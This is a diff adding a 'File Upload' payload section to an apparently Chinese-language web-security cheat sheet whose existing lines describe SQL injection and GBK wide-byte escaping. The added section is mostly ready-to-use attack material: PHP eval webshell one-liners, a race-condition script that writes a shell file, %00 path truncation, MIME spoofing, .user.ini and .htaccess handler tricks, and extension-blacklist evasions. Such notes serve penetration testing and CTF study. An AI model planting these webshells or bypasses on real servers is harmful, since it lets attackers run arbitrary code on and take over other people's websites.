@@ -84,3 +84,48 @@ select * from user where username='' or 1#' and password='$password'
 二次注入的原理在于，插入数据时使用了addslashes()函数，查询时则没有使用addslashes()函数，使得引号插入了查询时的SQL语句
 
 GBK注入的原因是因为GBK编码与addslashes()函数，\作为转义符来转义引号，其十六进制值为0x5C。而GBK编码的高位范围为0x81\~0xFE，低位范围为0x40\~0xFE，在\之前插入一个高位范围的字符，则会被GBK编码将两个字符识别一个GBK字符，从而使得引号进行逃逸
+
+# File Upload #
+
+## Payload ##
+* JS限制: 禁用JS
+* %00截断: ?path=../upload/shell.php%00
+* 竞争上传: 
+```
+<?php
+$file='web.php';
+$shell='<?php @eval($_POST["pass"]);?>';
+$file_put_contents($file, $shell);
+?>
+```
+* 内容检测: 
+```
+<script language=php>@eval($_POST['pass']);</script>
+<?= @eval($_POST["pass"]);?>
+```
+* MIME
+```
+Content-Type:image/png
+```
+* .user.ini
+```
+#shell.jpg
+<?php @eval($_POST["pass"]);?>
+
+#.user.ini
+auto_prepend_file=shell.jpg
+auto_append_file=shell.jpg
+auto_append_file=php://filter/read=convert.base64-decode/resource=shell.jpg
+```
+* 黑名单
+  * 大小写混写(pHp, PhP)
+  * 其他后缀名(php, php3, php4, php5, php7, pht, phtml, phps)
+* .htaccess(Apache)
+```
+SetHandler application/x-httpd-php
+
+SetHandler application/x-httpd-p\
+hp
+```
+
+## 总结 ##
